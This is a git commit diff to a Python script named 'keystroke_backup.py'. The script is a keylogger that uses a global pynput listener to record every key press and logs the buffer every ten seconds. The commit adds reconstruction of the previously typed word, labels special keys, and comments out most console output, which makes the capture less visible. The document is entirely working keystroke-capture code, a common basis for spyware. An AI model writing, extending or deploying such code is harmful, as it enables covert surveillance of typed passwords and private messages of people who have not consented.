2a7db9648fab9b6dd1f0de6e100a58ec122f30a1
Josh Hager <jhager603@gmail.com>
2022-12-15 22:22:01 -0500

    Now records previous words typed

--- keystroke_backup.py
+++ keystroke_backup.py
@@ -3,6 +3,7 @@ from pynput import keyboard
 from datetime import datetime
 
 keylog = []
+prev_word = ''
 line_position = 0
 
 def log():
@@ -15,16 +16,23 @@ def log():
             line_position = 0
 
 def on_press(key):
+    global prev_word
     try:
-        print(str(key.char))
+        # print(str(key.char))
         keylog.append(str(key.char))
+
+        if str(key.char).isalpha():
+            prev_word += str(key.char)
     except AttributeError:
         if(str(key)[4:] == 'space'):
             keylog.append(' ')
-            print(' ')
+            # print(' ')
+
+            print('Previous word: ' + prev_word)
+            prev_word = ''
         else:
-            keylog.append(str(key)[4:] + "this is a special key")
-            print(str(key)[4:])
+            keylog.append('<' + str(key)[4:] + '>')
+            # print('<' + str(key)[4:] + '>')
         
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
@@ -32,8 +40,8 @@ listener.start()
 while True:
     log()
     keylog = []
-    print('keylog cleared')
-    print('collecting for 10 seconds')
+    # print('keylog cleared')
+    # print('collecting for 10 seconds')
     sleep(10)
 
 
